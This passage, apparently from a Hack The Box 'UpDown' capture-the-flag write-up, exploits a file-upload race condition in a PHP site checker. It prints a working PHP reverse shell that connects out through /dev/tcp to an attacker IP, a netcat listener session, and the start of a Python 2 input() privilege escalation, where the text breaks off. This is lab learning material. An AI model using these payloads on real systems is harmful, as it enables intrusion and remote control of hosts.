+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#34;{$final_path}&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  # Read the uploaded file.
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	$websites = explode(&#34;\n&#34;,file_get_contents($final_path));
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	foreach($websites as $site){
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		$site=trim($site);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		if(!preg_match(&#34;#file://#i&#34;,$site) &amp;&amp; !preg_match(&#34;#data://#i&#34;,$site) &amp;&amp; !preg_match(&#34;#ftp://#i&#34;,$site)){
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			$check=isitup($site);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			if($check){
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				echo &#34;&lt;center&gt;{$site}&lt;br&gt;&lt;font color=&#39;green&#39;&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			}else{
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				echo &#34;&lt;center&gt;{$site}&lt;br&gt;&lt;font color=&#39;red&#39;&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		}else{
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			echo &#34;&lt;center&gt;&lt;font color=&#39;red&#39;&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  # Delete the uploaded file.
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	@unlink($final_path);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>function getExtension($file) {
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	$extension = strrpos($file,&#34;.&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	return ($extension===false) ? &#34;&#34; : substr($file,$extension+1);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;/section&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;/div&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;div id=&#34;footer_wrap&#34; class=&#34;outer&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;footer class=&#34;inner&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &lt;p class=&#34;copyright&#34;&gt;siteisup.htb (beta)&lt;/p&gt;&lt;br&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &lt;a class=&#34;changelog&#34; href=&#34;changelog.txt&#34;&gt;changelog.txt&lt;/a&gt;&lt;br&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;/footer&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;/div&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;/body&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/html&gt;
+</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># admin.php source code
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>DIRECTACCESS</span>){
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Access Denied&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#ToDo
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><ul><li><p>In the <code>checker.php</code> file, we can see an attack vector. If we upload a file that contains URLs for testing, the web application will create an upload directory and save the file there.</p></li><li><p>The directory is created by generating an MD5 hash of the current time at the time of the upload.</p></li><li><p>To exploit this behavior, we can upload a file with multiple URLs that will give us enough time for our payload (included in the file) to be executed.</p></li><li><p>However, we need to be mindful of the allowed file extensions:</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&#34;</span>,$ext)){
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Extension not allowed!&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span></code></pre></div><ul><li>This web application has blacklisted the following extensions: <code>php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar</code></li><li>I will use the <code>.phar</code> extension here.</li><li>I created the following file: <code>footHold.phar</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~$ echo -e <span style=color:#e6db74>&#34;http://google.com\nhttp://google.com\nhttp://google.com\n&lt;?php phpinfo() ?&gt;&#34;</span> &gt; footHold.phar
+</span></span></code></pre></div><ul><li>Let&rsquo;s upload the file for checking:</li></ul><p><img src=/images/Pasted-image-20230102234151.png alt="Image alt"></p><ul><li><p>After uploading the <code>footHold.phar</code> file, the web application will start checking every URL within the uploaded file.</p></li><li><p>The security problem with this code implementation is as follows:</p></li></ul><p>1- For each file uploaded, a user-accessible file is created in the uploads directory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-PHP data-lang=PHP><span style=display:flex><span>	<span style=color:#75715e># Create directory to upload our file.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	$dir <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;uploads/&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>md5</span>(<span style=color:#a6e22e>time</span>())<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;/&#34;</span>;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>is_dir</span>($dir)){
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>mkdir</span>($dir, <span style=color:#ae81ff>0770</span>, <span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e># Upload the file.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	$final_path <span style=color:#f92672>=</span> $dir<span style=color:#f92672>.</span>$file;
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>move_uploaded_file</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>], <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>$final_path<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>);
+</span></span></code></pre></div><p>2- This file will be deleted after the websites within it have been checked.
+3- The web application takes time to check if the website is up or down before deleting the uploaded file.
+4- The uploaded file will remain in the <code>uploads/&lt;randomly_generated_directory_name></code> directory while it is being checked.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># Read the uploaded file.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	$websites <span style=color:#f92672>=</span> <span style=color:#a6e22e>explode</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#a6e22e>file_get_contents</span>($final_path));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>foreach</span>($websites <span style=color:#66d9ef>as</span> $site){
+</span></span><span style=display:flex><span>		$site<span style=color:#f92672>=</span><span style=color:#a6e22e>trim</span>($site);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;#file://#i&#34;</span>,$site) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;#data://#i&#34;</span>,$site) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;#ftp://#i&#34;</span>,$site)){
+</span></span><span style=display:flex><span>			$check<span style=color:#f92672>=</span><span style=color:#a6e22e>isitup</span>($site);
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span>($check){
+</span></span><span style=display:flex><span>				<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;center&gt;</span><span style=color:#e6db74>{</span>$site<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;br&gt;&lt;font color=&#39;green&#39;&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;&#34;</span>;
+</span></span><span style=display:flex><span>			}<span style=color:#66d9ef>else</span>{
+</span></span><span style=display:flex><span>				<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;center&gt;</span><span style=color:#e6db74>{</span>$site<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;br&gt;&lt;font color=&#39;red&#39;&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;&#34;</span>;
+</span></span><span style=display:flex><span>			}
+</span></span><span style=display:flex><span>		}<span style=color:#66d9ef>else</span>{
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;center&gt;&lt;font color=&#39;red&#39;&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;&#34;</span>;
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e># Delete the uploaded file.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#f92672>@</span><span style=color:#a6e22e>unlink</span>($final_path);
+</span></span></code></pre></div><h1 id=foothold-shell-as-www-data>Foothold: Shell as www-data</h1><ul><li>From an attacker&rsquo;s perspective, we can upload a file with multiple links to gain more time before our uploaded file is deleted. Then, we can go to the <code>uploads/&lt;randomly_generated_directory_name></code> directory and click the uploaded file to see the results of the embedded PHP code.</li></ul><p><img src=/images/Pasted-image-20230102235728.png alt="Image alt"></p><p><img src=/images/Pasted-image-20230102235752.png alt="Image alt"></p><ul><li>Okay, now that we have executed the <code>phpinfo()</code> function, we can start the process of creating our PHP reverse shell.</li></ul><p><img src=/images/Pasted-image-20230102235831.png alt="Image alt"></p><ul><li>Let&rsquo;s check the <code>disable_functions</code> section to get an idea about the allowed and disabled PHP functions:</li></ul><p><img src=/images/Pasted-image-20230103000203.png alt="Image alt"></p><ul><li>Here is the PHP reverse shell that I used:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># shell.phar
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>google</span><span style=color:#f92672>.</span><span style=color:#a6e22e>com</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>google</span><span style=color:#f92672>.</span><span style=color:#a6e22e>com</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>google</span><span style=color:#f92672>.</span><span style=color:#a6e22e>com</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>$descriptorspec <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;pipe&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>),  <span style=color:#75715e>// stdin is a pipe that the child will read from
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   <span style=color:#ae81ff>1</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;pipe&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>),  <span style=color:#75715e>// stdout is a pipe that the child will write to
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   <span style=color:#ae81ff>2</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;pipe&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>)   <span style=color:#75715e>// stderr is a pipe that the child will write to
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$process <span style=color:#f92672>=</span> <span style=color:#a6e22e>proc_open</span>(<span style=color:#e6db74>&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.12/4444 0&gt;&amp;1&#34;&#39;</span>, $descriptorspec, $pipes);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_resource</span>($process)) {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// $pipes now looks like this:
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// 0 =&gt; writeable handle connected to child stdin
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// 1 =&gt; readable handle connected to child stdout
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// Any error output will be appended to /tmp/error-output.txt
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fwrite</span>($pipes[<span style=color:#ae81ff>0</span>], <span style=color:#e6db74>&#39;&lt;?php print_r($_ENV); ?&gt;&#39;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fclose</span>($pipes[<span style=color:#ae81ff>0</span>]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>stream_get_contents</span>($pipes[<span style=color:#ae81ff>1</span>]);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fclose</span>($pipes[<span style=color:#ae81ff>1</span>]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// It is important that you close any pipes before calling
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// proc_close in order to avoid a deadlock
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $return_value <span style=color:#f92672>=</span> <span style=color:#a6e22e>proc_close</span>($process);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;command returned </span><span style=color:#e6db74>$return_value\n</span><span style=color:#e6db74>&#34;</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><ul><li><p>the script creates a process that runs the Bash shell and connects it to a remote host and port using the <code>bash -i >& /dev/tcp/10.10.14.12/4444 0>&amp;1</code> command. The $descriptorspec array specifies the pipes that will be used to communicate with the child process. The proc_open() function is then used to start the process and return a resource that represents it.</p></li><li><p>Getting Reverse Shell:</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>goku㉿exploitation<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ nc -lvp <span style=color:#ae81ff>4444</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>4444</span> ...
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.14.12<span style=color:#f92672>]</span> from siteisup.htb <span style=color:#f92672>[</span>10.10.11.177<span style=color:#f92672>]</span> <span style=color:#ae81ff>43958</span>
+</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>911<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
+</span></span><span style=display:flex><span>bash: no job control in this shell
+</span></span><span style=display:flex><span>www-data@updown:/var/www/dev/uploads/3b388790d35d58cf684975ffc668c9ec$ id
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>www-data@updown:/var/www/dev/uploads/3b388790d35d58cf684975ffc668c9ec$
+</span></span></code></pre></div><h1 id=privilige-escalation-to-developer>Privilige Escalation To <code>developer</code></h1><ul><li><p>After gaining access to the machine, I found a <code>developer</code> user in the home directory and a directory called <code>dev</code> containing the following files: a binary file <code>siteisup</code> with the SUID bit set and a file called <code>siteisup_test.py</code></p></li><li><p>I used the <code>strings</code> command to perform basic static binary analysis on the file</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@updown:/home/developer/dev$ ls -alh
+</span></span><span style=display:flex><span>ls -alh
+</span></span><span style=display:flex><span>total 32K
+</span></span><span style=display:flex><span>drwxr-x--- <span style=color:#ae81ff>2</span> developer www-data  4.0K Jun <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2022</span> .
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>6</span> developer developer 4.0K Aug <span style=color:#ae81ff>30</span> 11:24 ..
+</span></span><span style=display:flex><span>-rwsr-x--- <span style=color:#ae81ff>1</span> developer www-data   17K Jun <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2022</span> siteisup
+</span></span><span style=display:flex><span>-rwxr-x--- <span style=color:#ae81ff>1</span> developer www-data   <span style=color:#ae81ff>154</span> Jun <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2022</span> siteisup_test.py
+</span></span><span style=display:flex><span>www-data@updown:/home/developer/dev$ cat siteisup_test.py
+</span></span><span style=display:flex><span>cat siteisup_test.py
+</span></span><span style=display:flex><span>import requests
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> input<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Enter URL here:&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>page <span style=color:#f92672>=</span> requests.get<span style=color:#f92672>(</span>url<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> page.status_code <span style=color:#f92672>==</span> 200:
+</span></span><span style=display:flex><span>	print <span style=color:#e6db74>&#34;Website is up&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>	print <span style=color:#e6db74>&#34;Website is down&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>www-data@updown:/home/developer/dev$ strings siteisup
+</span></span><span style=display:flex><span>strings siteisup
+</span></span><span style=display:flex><span>/lib64/ld-linux-x86-64.so.2
+</span></span><span style=display:flex><span>libc.so.6
+</span></span><span style=display:flex><span>puts
+</span></span><span style=display:flex><span>setresgid
+</span></span><span style=display:flex><span>setresuid
+</span></span><span style=display:flex><span>system
+</span></span><span style=display:flex><span>getegid
+</span></span><span style=display:flex><span>geteuid
+</span></span><span style=display:flex><span>__cxa_finalize
+</span></span><span style=display:flex><span>__libc_start_main
+</span></span><span style=display:flex><span>GLIBC_2.2.5
+</span></span><span style=display:flex><span>_ITM_deregisterTMCloneTable
+</span></span><span style=display:flex><span>__gmon_start__
+</span></span><span style=display:flex><span>_ITM_registerTMCloneTable
+</span></span><span style=display:flex><span>u+UH
+</span></span><span style=display:flex><span><span style=color:#f92672>[]</span>A<span style=color:#ae81ff>\A</span><span style=color:#f92672>]</span>A^A_
+</span></span><span style=display:flex><span>Welcome to <span style=color:#e6db74>&#39;siteisup.htb&#39;</span> application
+</span></span><span style=display:flex><span>/usr/bin/python /home/developer/dev/siteisup_test.py
+</span></span><span style=display:flex><span>:*3$<span style=color:#e6db74>&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>crtstuff.c
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>deregister_tm_clones
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__do_global_dtors_aux
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>completed.8061
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__do_global_dtors_aux_fini_array_entry
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>frame_dummy
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__frame_dummy_init_array_entry
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>siteisup.c
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__FRAME_END__
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__init_array_end
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>_DYNAMIC
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__init_array_start
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__GNU_EH_FRAME_HDR
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>_GLOBAL_OFFSET_TABLE_
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__libc_csu_fini
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>_ITM_deregisterTMCloneTable
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>puts@@GLIBC_2.2.5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>setresuid@@GLIBC_2.2.5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>_edata
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>setresgid@@GLIBC_2.2.5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>system@@GLIBC_2.2.5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>geteuid@@GLIBC_2.2.5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__libc_start_main@@GLIBC_2.2.5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__data_start
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__gmon_start__
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__dso_handle
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>_IO_stdin_used
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__libc_csu_init
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>getegid@@GLIBC_2.2.5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__bss_start
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>main
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__TMC_END__
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>_ITM_registerTMCloneTable
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>__cxa_finalize@@GLIBC_2.2.5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.symtab
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.strtab
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.shstrtab
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.interp
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.note.gnu.property
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.note.gnu.build-id
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.note.ABI-tag
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.gnu.hash
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.dynsym
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.dynstr
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.gnu.version
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.gnu.version_r
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.rela.dyn
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.rela.plt
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.init
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.plt.got
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.plt.sec
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.text
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.fini
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.rodata
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.eh_frame_hdr
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.eh_frame
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.init_array
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.fini_array
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.dynamic
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.data
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.bss
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.comment
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>www-data@updown:/home/developer/dev</span>$<span style=color:#e6db74>
+</span></span></span></code></pre></div><ul><li>The executable file <code>siteisup</code> runs the <code>siteisup_test.py</code> file using Python 2 instead of Python 3.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>....
+</span></span><span style=display:flex><span>/usr/bin/python /home/developer/dev/siteisup_test.py
+</span></span><span style=display:flex><span>....
+</span></span></code></pre></div><ul><li>The <code>siteisup_test.py</code> Python code uses the <code>input()</code> function, which can be exploited in Python 2 (for more details, see the following article). <a href=https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1>Hacking Python Application - By Vickie Li</a>)</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;Enter URL here:&#34;</span>)
+</span></span><span style=display:flex><span>page <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> page<span style=color:#f92672>.</span>status_code <span style=color:#f92672>==</span> <span style=color:#ae81ff>200</span>:
+</span></span><span style=display:flex><span>	print <span style=color:#e6db74>&#34;Website is up&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>	print <span style=color:#e6db74>&#34;Website is down&#34;</span>
+</span></span></code></pre></div><ul><li>Let&rsquo;s exploit the input() function to gain access as the developer user!</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@updown:/home/developer/dev$ ./siteisup
